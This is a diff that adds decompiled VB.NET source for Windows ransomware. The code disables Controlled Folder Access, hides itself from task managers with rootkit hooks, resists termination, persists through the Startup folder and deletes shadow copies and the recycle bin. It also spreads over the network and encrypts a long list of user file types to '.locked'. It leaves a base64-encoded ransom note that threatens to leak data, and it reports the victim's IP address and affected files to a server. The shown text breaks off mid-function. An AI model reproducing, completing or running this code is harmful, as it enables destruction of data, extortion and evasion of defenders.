@@ -1,0 +1,1094 @@
+﻿Imports System
+Imports System.Collections.Generic
+Imports System.Collections.Specialized
+Imports System.Diagnostics
+Imports System.IO
+Imports System.Management
+Imports System.Net
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System.Security.Cryptography
+Imports System.Security.Principal
+Imports System.Text
+Imports System.Threading
+Imports System.Threading.Tasks
+Imports System.Windows.Forms
+Imports Complex.cvew
+Imports Microsoft.Win32
+
+Namespace Complex
+	' Token: 0x02000002 RID: 2
+	Friend Class Program
+		' Token: 0x06000001 RID: 1
+		Private Declare Function DefineDosDevice Lib "kernel32.dll" (dwFlags As UInteger, lpDeviceName As String, lpTargetPath As String) As Boolean
+
+		' Token: 0x06000002 RID: 2
+		Private Declare Function DeleteVolumeMountPoint Lib "kernel32.dll" (lpszVolumeMountPoint As String) As Boolean
+
+		' Token: 0x06000003 RID: 3
+		Friend Declare Unicode Function MoveFileExW Lib "kernel32.dll" (lpExistingFileName As String, lpNewFileName As String, dwFlags As UInteger) As Boolean
+
+		' Token: 0x06000004 RID: 4 RVA: 0x00002068 File Offset: 0x00000268
+		Private Shared Sub Main(args As String())
+			Try
+				MutexHelper.CheckMutex(Program.appGuid)
+			Catch ex As Exception
+			End Try
+			Try
+				If Program.Sniffing = "YES" Then
+					AddressOf AntiSniffer.SniffersKiller.Start()
+				End If
+			Catch
+			End Try
+			If Program.Delay = "YES" Then
+				Thread.Sleep(Integer.Parse(Program.DelayTime))
+			End If
+			If Program.TransparentMan = "YES" Then
+				Try
+					If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
+						Dim processesToCheck As String() = New String() { Program.Base64Decode("VGFza21ncg=="), Program.Base64Decode("dGFza21ncg=="), Program.Base64Decode("UHJvY2Vzc0hhY2tlcg=="), Program.Base64Decode("cHJvY2V4cA==") }
+						New Thread(Sub()
+							Rootkit.WaitForProcess(processesToCheck)
+						End Sub) With { .IsBackground = True }.Start()
+					End If
+				Catch
+				End Try
+				Try
+					ROOT1.HookApplication(Program.Base64Decode("dGFza21ncg=="))
+				Catch
+				End Try
+				Try
+					ROOT1.HookApplication(Program.Base64Decode("cHJvY2V4cA=="))
+				Catch
+				End Try
+				Try
+					ROOT1.HookApplication(Program.Base64Decode("cHJvY2V4cDY0"))
+				Catch
+				End Try
+				Try
+					ROOT1.HookApplication(Program.Base64Decode("UHJvY2Vzc0hhY2tlcg=="))
+				Catch
+				End Try
+				AddressOf Rootkit.Hide.Start()
+			End If
+			If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) AndAlso Program.FAC = "YES" Then
+				Try
+					Program.RunPS(Program.Base64Decode("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="))
+				Catch
+				End Try
+			End If
+			If Program.CriticalProcess = "YES" AndAlso Not ProcessCritical.IsAdmin() Then
+				ProcessCritical.YesItIs()
+			End If
+			If Program.Live4Ever = "YES" AndAlso ProcessCritical.IsAdmin() Then
+				New AntiKill().DisTaskManager(False)
+				New AntiKill().IamInmortal()
+			End If
+			If Program.AntiVM = "YES" Then
+				Anti_Analysis.RunAntiAnalysis()
+			End If
+			Dim mainModule As ProcessModule = Process.GetCurrentProcess().MainModule
+			Dim fileName As String = mainModule.FileName
+			Dim str As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\"
+			Dim b As String = str + Path.GetFileName(fileName)
+			If Program.DeceiveMe = "YES" AndAlso fileName <> b Then
+				AddressOf Program.Deceive.Start()
+			End If
+			If Program.Persistence = "YES" AndAlso mainModule IsNot Nothing Then
+				If fileName <> b Then
+					Try
+						Program.rand = Program.NextInt(0, Program.meltList.Count)
+						File.Copy(fileName, str + Program.meltList(Program.rand), True)
+						Process.Start(str + Program.meltList(Program.rand))
+						Program.CleanMyStuff()
+						Process.GetCurrentProcess().Kill()
+					Catch ex2 As Exception
+					End Try
+				End If
+			End If
+			Try
+				If Program.DelayedActivation = "YES" AndAlso DateTime.Now < Program.ActiveAfterDateTime Then
+					Return
+				End If
+			Catch
+			End Try
+			Try
+				If Program.ExpireOption = "YES" AndAlso DateTime.Now > Program.ExpireAfterDateTime Then
+					Program.CleanMyStuff()
+				End If
+			Catch
+			End Try
+			For Each arguments As String In Program.netShadowList
+				Program.ProcessCommand("net.exe", arguments)
+			Next
+			For Each arguments2 As String In Program.scList
+				Program.ProcessCommand("sc.exe", arguments2)
+			Next
+			For Each arguments3 As String In Program.taskList
+				Program.ProcessCommand("taskkill.exe", arguments3)
+			Next
+			For Each arguments4 As String In Program.vssList
+				Program.ProcessCommand(Program.Base64Decode("dnNzYWRtaW4uZXhl"), arguments4)
+			Next
+			For Each arguments5 As String In Program.delList
+				Program.ProcessCommand(Program.Base64Decode("ZGVsLmV4ZQ=="), arguments5)
+			Next
+			If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
+				Program.ProcessCommand("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\$Recycle.bin")
+			End If
+			If Program.SpreadOverNetwork = "YES" AndAlso Program.Internet() AndAlso New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
+				AddressOf NetworkSpreading.Run.Start()
+			End If
+			If Program.WoL = "YES" Then
+			End If
+			If Program.StaticLooks = "NO" Then
+				Program.DynamicPass = Crypto.RandomString(32)
+			Else
+				Program.DynamicPass = "3FGC7QZ13R9WNYMW1MISG70EJXK4EVFD"
+			End If
+			Dim text As String = CryptographyHelper.Encrypt(Program.DynamicPass)
+			Shortcut.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Program.MyStartName), Program.LeaveRegards(text), Nothing, Nothing, "Installer...", "Ctrl+Shift+X", Nothing)
+			If Program.LANShares = "YES" Then
+				Try
+					Program.MapDrv()
+				Catch
+				End Try
+			End If
+			Try
+				Program.Crypt(New String() { "[auto]" }, New String() { "bco", "one", "dat", "txt", "vib", "vbm", "vbk", "jpeg", "gif", "lst", "tbl", "cdx", "log", "fpt", "jpg", "png", "php", "cs", "cpp", "rar", "zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx", "sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost", "pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java", "cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z" }, New String(-1) {}, Program.DynamicPass, ".locked")
+			Catch
+			End Try
+			Program.DynamicPass = Crypto.RandomString(32)
+			If Not File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt") Then
+				Using streamWriter As StreamWriter = New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt")
+					streamWriter.WriteLine(Program.Base64Decode("eW91ciBmaWxlcywgZG9jdW1lbnRzLCBhbmQgYWxsIG9mIHlvdXIgbmV0d29yayBlbmNyeXB0ZWQuDQphbGwgYmFja3VwIGRyaXZlIGFuZCB0YXBlIGRlbGV0ZWQgb2YgZm9ybWF0dGVkLg0KYWxsIHNoYWRvdyBjb3BpZXMgZGVsZXRlZC4NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KRE9OVCBSRVNUQVJUIFBDDQpET05UIFRPVUNIIE9SIEVESVQgTE9DS0VEIEZJTEVTDQpET05UIFVTRSBSRUdVTEFSIFJFQ09WRVJZIFNPRlRXQVJFLCBFVkVOICJNSUNST1NPRlQgUkVDT1ZFUlkgVE9PTCINCg0KQUxMIE9GIFRIT1NFIE5PVEVTIFdJTEwgQ0FVU0UgWU9VIExPU1QgWU9VUiBGSUxFUyBGT1IgRVZFUg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KaW1wb3J0YW50IGZpbGVzLCBkb2N1bWVudHMgYW5kIGV0YyBkb3dubG9hZGVkLCBhZnRlciBwdXJjaGFzZSB0aW1lIGlmIHlvdSBkb250IHBheSwgd2Ugd2lsbCBsZWFrIHRoZW0NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCmNvbnRhY3QgOiAwMDEwMDIwMDNAc2VjbWFpbC5wcm8="))
+					streamWriter.WriteLine(vbCrLf)
+					streamWriter.WriteLine(Program.Base64Decode("S2V5IElkZW50aWZpZXI6IA=="))
+					streamWriter.WriteLine(text)
+					If Program.MultipleThreads = "NO" Then
+						streamWriter.WriteLine(vbCrLf)
+						streamWriter.WriteLine(Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(Program.EncryptedFiles.Count))
+					End If
+				End Using
+			Else
+				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt", vbCrLf & "Aditional KeyId:" & vbCrLf + text)
+			End If
+			For Each text2 As String In Program.EncryptedDirs
+				If Not(text2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) Then
+					Try
+						If Not File.Exists(text2 + "\HOW_TO_DECYPHER_FILES.txt") Then
+							File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt", text2 + "\HOW_TO_DECYPHER_FILES.txt", True)
+						Else
+							File.AppendAllText(text2 + "\HOW_TO_DECYPHER_FILES.txt", vbCrLf & "Aditional KeyId:" & vbCrLf + text)
+						End If
+					Catch ex3 As Exception
+					End Try
+				End If
+			Next
+			If Program.RichText = "YES" Then
+				If Not File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.hta") Then
+					Using streamWriter As StreamWriter = New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.hta")
+						streamWriter.WriteLine(Program.Base64Decode("MESSAGERICH"))
+						streamWriter.WriteLine(vbCrLf)
+						streamWriter.WriteLine(Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="))
+						streamWriter.WriteLine(text + Program.Base64Decode("PC9wPg=="))
+						If Program.MultipleThreads = "NO" Then
+							streamWriter.WriteLine(vbCrLf)
+							streamWriter.WriteLine(Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(Program.EncryptedFiles.Count) + Program.Base64Decode("PC9wPg=="))
+						End If
+					End Using
+				Else
+					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.hta", Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + vbCrLf & "Aditional KeyId:" & vbCrLf + text + Program.Base64Decode("PC9wPg=="))
+				End If
+			End If
+			If Program.FtpLog = "YES" Then
+				Try
+					If Program.MultipleThreads = "NO" Then
+						UtilMe.Send("URL", "USERNAME", "ACCESO", String.Concat(New String() { Program.Base64Decode("Q2xpZW50IElQOiAg"), New WebClient().DownloadString(Program.Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20=")), Program.Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), Nothing.[Date].ToString(), vbCrLf, Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog"), Convert.ToString(Program.EncryptedFiles.Count), vbCrLf, Program.Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), vbCrLf, Convert.ToString(Program.EncryptedFiles), vbCrLf, Program.Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), text }))
+					Else
+						UtilMe.Send("URL", "USERNAME", "ACCESO", String.Concat(New String() { Program.Base64Decode("Q2xpZW50IElQOiAg"), New WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20="), Program.Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), Nothing.[Date].ToString(), vbCrLf, Program.Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), vbCrLf, Convert.ToString(Program.EncryptedFiles), vbCrLf, Program.Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), text }))
+					End If
+				Catch
+				End Try
+			End If
+			If Program.WallpaperChanger = "YES" Then
+				Try
+					Wallpaper.[Set](New Uri(""))
+				Catch
+				End Try
+			End If
+			If Program.RichText = "NO" Then
+				If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt") Then
+					Process.Start(Program.Base64Decode("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.txt")
+				End If
+			ElseIf File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.hta") Then
+				Process.Start(Program.Base64Decode("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\HOW_TO_DECYPHER_FILES.hta")
+			End If
+			If Not String.IsNullOrEmpty(Program.toolLocation) Then
+				Try
+					File.Delete(Program.toolLocation)
+				Catch
+				End Try
+			End If
+			If Program.imha = "EVET" Then
+				Program.CleanMyStuff()
+			End If
+		End Sub
+
+		' Token: 0x06000005 RID: 5 RVA: 0x00003490 File Offset: 0x00001690
+		Public Shared Sub Deceive()
+			MessageBox.Show(Program.Base64Decode("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), Program.Base64Decode("QXRlbnRpb24h"), MessageBoxButtons.OK, MessageBoxIcon.Hand)
+		End Sub
+
+		' Token: 0x06000006 RID: 6 RVA: 0x000034B0 File Offset: 0x000016B0
+		Private Shared Function NextInt(min As Integer, max As Integer) As Integer
+			Dim rngcryptoServiceProvider As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
+			Dim array As Byte() = New Byte(3) {}
+			rngcryptoServiceProvider.GetBytes(array)
+			Dim seed As Integer = BitConverter.ToInt32(array, 0)
+			Return New Random(seed).[Next](min, max)
+		End Function
+
+		' Token: 0x06000007 RID: 7 RVA: 0x000034EC File Offset: 0x000016EC
+		Public Shared Function TraverseTree(root As String, extensions As String(), extension As String, excluded As String(), DynamicPass As String) As List(Of String)
+			Dim list As List(Of String) = New List(Of String)()
+			Dim stack As Stack(Of String) = New Stack(Of String)(20)
+			stack.Push(root)
+			While stack.Count > 0
+				Dim text As String = stack.Pop()
+				Dim directories As String()
+				Try
+					directories = Directory.GetDirectories(text)
+				Catch
+					Continue While
+				End Try
+				Dim array As String() = Nothing
+				Try
+					If text.ToLower().Contains("program files") OrElse text.ToLower().Contains("windows") OrElse text.ToLower().Contains("perflogs") OrElse text.ToLower().Contains("internet explorer") OrElse text.ToLower().Contains("programdata") OrElse text.ToLower().Contains("appdata") Then
+						Continue While
+					End If
+					array = Directory.GetFiles(text)
+				Catch
+					Continue While
+				End Try
+				Dim array2 As String() = array
+				Dim i As Integer = 0
+				While i < array2.Length
+					Dim fileName As String = array2(i)
+					Try
+						Dim fileInfo As FileInfo = New FileInfo(fileName)
+						If Not fileInfo.FullName.Contains("autoexec.bat") AndAlso Not fileInfo.FullName.Contains("desktop.ini") AndAlso Not fileInfo.FullName.Contains("autorun.inf") AndAlso Not fileInfo.FullName.Contains("ntuser.dat") AndAlso Not fileInfo.FullName.Contains("iconcache.db") AndAlso Not fileInfo.FullName.Contains("bootsect.bak") AndAlso Not fileInfo.FullName.Contains("boot.ini") AndAlso Not fileInfo.FullName.Contains("ntuser.dat.log") AndAlso Not fileInfo.FullName.Contains("thumbs.db") AndAlso Not fileInfo.FullName.ToLower().Contains("bootmgr") AndAlso Not fileInfo.FullName.ToLower().Contains("pagefile.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("config.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.ini") AndAlso Not fileInfo.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) AndAlso Not fileInfo.FullName.Contains("RSAKeys") AndAlso Not fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") AndAlso Not fileInfo.FullName.EndsWith(".locked") AndAlso Not fileInfo.FullName.EndsWith("exe") AndAlso Not fileInfo.FullName.EndsWith("dll") AndAlso Not fileInfo.FullName.EndsWith("EXE") AndAlso Not fileInfo.FullName.EndsWith("DLL") AndAlso Not fileInfo.FullName.Contains("Recycle.Bin") AndAlso Not fileInfo.FullName.Contains(Program.MyStartName) Then
+							If File.Exists(fileInfo.FullName) AndAlso CDbl(fileInfo.Length) <= Double.Parse(Program.Mb) * 1024.0 * 1024.0 AndAlso Program.Size = "YES" Then
+								list.Add(fileInfo.FullName)
+								Program.WorkerCrypter2(list, extensions, extension, excluded, DynamicPass)
+								list.Clear()
+							ElseIf File.Exists(fileInfo.FullName) AndAlso Program.Size = "NO" Then
+								list.Add(fileInfo.FullName)
+								Program.WorkerCrypter2(list, extensions, extension, excluded, DynamicPass)
+								list.Clear()
+							End If
+						End If
+					Catch
+					End Try
+					IL_3C4:
+					i += 1
+					Continue While
+					GoTo IL_3C4
+				End While
+				For Each item As String In directories
+					stack.Push(item)
+				Next
+			End While
+			Return list
+		End Function
+
+		' Token: 0x06000008 RID: 8 RVA: 0x0000396C File Offset: 0x00001B6C
+		Public Shared Function GetFilesList(docPath As String) As List(Of String)
+			Dim list As List(Of String) = New List(Of String)()
+			Dim directoryInfo As DirectoryInfo = New DirectoryInfo(docPath)
+			Try
+				For Each fileInfo As FileInfo In directoryInfo.EnumerateFiles()
+					Try
+						If Not fileInfo.FullName.ToLower().Contains("program files") AndAlso Not fileInfo.FullName.ToLower().Contains("windows") AndAlso Not fileInfo.FullName.ToLower().Contains("perflogs") AndAlso Not fileInfo.FullName.ToLower().Contains("internet explorer") AndAlso Not fileInfo.FullName.ToLower().Contains("programdata") AndAlso Not fileInfo.FullName.ToLower().Contains("appdata") AndAlso Not fileInfo.FullName.ToLower().Contains("autoexec.bat") AndAlso Not fileInfo.FullName.ToLower().Contains("desktop.ini") AndAlso Not fileInfo.FullName.ToLower().Contains("autorun.inf") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.dat") AndAlso Not fileInfo.FullName.ToLower().Contains("iconcache.db") AndAlso Not fileInfo.FullName.ToLower().Contains("bootsect.bak") AndAlso Not fileInfo.FullName.ToLower().Contains("boot.ini") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.dat.log") AndAlso Not fileInfo.FullName.ToLower().Contains("thumbs.db") AndAlso Not fileInfo.FullName.ToLower().Contains("bootmgr") AndAlso Not fileInfo.FullName.ToLower().Contains("pagefile.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("config.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.ini") AndAlso Not fileInfo.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) AndAlso Not fileInfo.FullName.Contains("RSAKeys") AndAlso Not fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") AndAlso Not fileInfo.FullName.EndsWith(".locked") AndAlso Not fileInfo.FullName.EndsWith("exe") AndAlso Not fileInfo.FullName.EndsWith("dll") Then
+							If File.Exists(fileInfo.FullName) AndAlso CDbl(fileInfo.Length) <= Double.Parse(Program.Mb) * 1024.0 * 1024.0 AndAlso Program.Size = "YES" Then
+								list.Add(fileInfo.FullName)
+							ElseIf File.Exists(fileInfo.FullName) AndAlso Program.Size = "NO" Then
+								list.Add(fileInfo.FullName)
+							End If
+						End If
+					Catch ex As UnauthorizedAccessException
+					Catch
+					End Try
+				Next
+				For Each directoryInfo2 As DirectoryInfo In directoryInfo.EnumerateDirectories("*")
+					If Not directoryInfo.FullName.ToLower().Contains("program files") AndAlso Not directoryInfo.FullName.ToLower().Contains("windows") AndAlso Not directoryInfo.FullName.ToLower().Contains("perflogs") AndAlso Not directoryInfo.FullName.ToLower().Contains("internet explorer") AndAlso Not directoryInfo.FullName.ToLower().Contains("programdata") AndAlso Not directoryInfo.FullName.ToLower().Contains("appdata") Then
+						Try
+							For Each fileInfo As FileInfo In directoryInfo2.EnumerateFiles("*", SearchOption.AllDirectories)
+								Try
+									If Not fileInfo.FullName.ToLower().Contains("autoexec.bat") AndAlso Not fileInfo.FullName.ToLower().Contains("desktop.ini") AndAlso Not fileInfo.FullName.ToLower().Contains("autorun.inf") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.dat") AndAlso Not fileInfo.FullName.ToLower().Contains("iconcache.db") AndAlso Not fileInfo.FullName.ToLower().Contains("bootsect.bak") AndAlso Not fileInfo.FullName.ToLower().Contains("boot.ini") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.dat.log") AndAlso Not fileInfo.FullName.ToLower().Contains("thumbs.db") AndAlso Not fileInfo.FullName.ToLower().Contains("bootmgr") AndAlso Not fileInfo.FullName.ToLower().Contains("pagefile.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("config.sys") AndAlso Not fileInfo.FullName.ToLower().Contains("ntuser.ini") AndAlso Not fileInfo.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) AndAlso Not fileInfo.FullName.Contains("RSAKeys") AndAlso Not fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") AndAlso Not fileInfo.FullName.EndsWith(".locked") AndAlso Not fileInfo.FullName.EndsWith("exe") AndAlso Not fileInfo.FullName.EndsWith("dll") Then
+										If File.Exists(fileInfo.FullName) AndAlso CDbl(fileInfo.Length) <= Double.Parse(Program.Mb) * 1024.0 * 1024.0 AndAlso Program.Size = "YES" Then
+											list.Add(fileInfo.FullName)
+										ElseIf File.Exists(fileInfo.FullName) AndAlso Program.Size = "NO" Then
+											list.Add(fileInfo.FullName)
+										End If
+									End If
+								Catch ex2 As UnauthorizedAccessException
+								Catch
+								End Try
+							Next
+						Catch ex3 As UnauthorizedAccessException
+						Catch
+						End Try
+					End If
+				Next
+			Catch ex4 As DirectoryNotFoundException
+			Catch ex5 As UnauthorizedAccessException
+			Catch ex6 As PathTooLongException
+			Catch
+			End Try
+			Return list
+		End Function
+
+		' Token: 0x06000009 RID: 9 RVA: 0x000041F4 File Offset: 0x000023F4
+		Public Shared Function ProcessCommand(Optional command As String = "", Optional arguments As String = "") As String
+			Dim result As String = ""
+			Try
+				Dim process As Process = New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = command, .Arguments = arguments, .UseShellExecute = False, .RedirectStandardOutput = True, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
+				process.Start()
+			Catch
+			End Try
+			Return result
+		End Function
+
+		' Token: 0x0600000A RID: 10 RVA: 0x00004288 File Offset: 0x00002488
+		Public Shared Sub RunPS(args As String)
+			Dim process As Process = New Process() With { .StartInfo = New ProcessStartInfo() With { .FileName = "powershell", .Arguments = args, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True } }
+			process.Start()
+		End Sub
+
+		' Token: 0x0600000B RID: 11 RVA: 0x000042D8 File Offset: 0x000024D8
+		Public Shared Function ReverseString(s As String) As String
+			Dim array As Char() = s.ToCharArray()
+			Array.Reverse(array)
+			Return New String(array)
+		End Function
+
+		' Token: 0x0600000C RID: 12 RVA: 0x00004300 File Offset: 0x00002500
+		Public Shared Function Base64Decode(base64EncodedData As String) As String
+			Dim bytes As Byte() = Convert.FromBase64String(base64EncodedData)
+			Return Encoding.UTF8.GetString(bytes)
+		End Function
+
+		' Token: 0x0600000D RID: 13 RVA: 0x00004324 File Offset: 0x00002524
+		Private Shared Sub MapDrv()
+			If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
+				Try
+					Dim base64EncodedData As String = Program.ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U")
+					Dim registryKey As RegistryKey = Registry.LocalMachine.OpenSubKey(Program.Base64Decode(base64EncodedData), True)
+					If registryKey IsNot Nothing Then
+						registryKey.SetValue(Program.Base64Decode("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord)
+						registryKey.SetValue(Program.Base64Decode("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord)
+						registryKey.Close()
+					End If
+				Catch
+				End Try
+			End If
+			If Program.HorseMount = "YES" Then
+				Try
+					Dim text As String = Path.GetTempFileName().Replace(".tmp", ".bat")
+					File.WriteAllText(text, Program.Base64Decode("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII)
+					Program.ProcessCommand("cmd.exe", "/C " + text)
+					If File.Exists(text) Then
+						File.Delete(text)
+					End If
+					If File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")) Then
+						File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"))
+					End If
+					If File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")) Then
+						File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"))
+					End If
+				Catch
+				End Try
+			End If
+			Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("select * from Win32_NetworkConnection")
+			For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]()
+				Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
+				If Not Program.DizonList.Contains(managementObject.Path.ToString().Split(New Char() { "="c })(1).ToString().Replace("\\", "\").Replace("\\\\", "\\").Replace("""", "").Split(New Char() { "("c })(0).Trim()) Then
+					Program.DizonList.Add(managementObject.Path.ToString().Split(New Char() { "="c })(1).ToString().Replace("\\", "\").Replace("\\\\", "\\").Replace("""", "").Split(New Char() { "("c })(0).Trim())
+				End If
+			Next
+		End Sub
+
+		' Token: 0x0600000E RID: 14 RVA: 0x0000466C File Offset: 0x0000286C
+		Public Shared Function Internet() As Boolean
+			Dim webRequest As WebRequest = WebRequest.Create("https://www.google.com/")
+			Try
+				webRequest.GetResponse()
+			Catch
+				Return False
+			End Try
+			Return True
+		End Function
+
+		' Token: 0x0600000F RID: 15 RVA: 0x000046B0 File Offset: 0x000028B0
+		Public Shared Sub CleanMyStuff()
+			Program.ProcessCommand("cmd.exe", Program.Base64Decode("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="))
+			Dim str As String = Program.Base64Decode("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==")
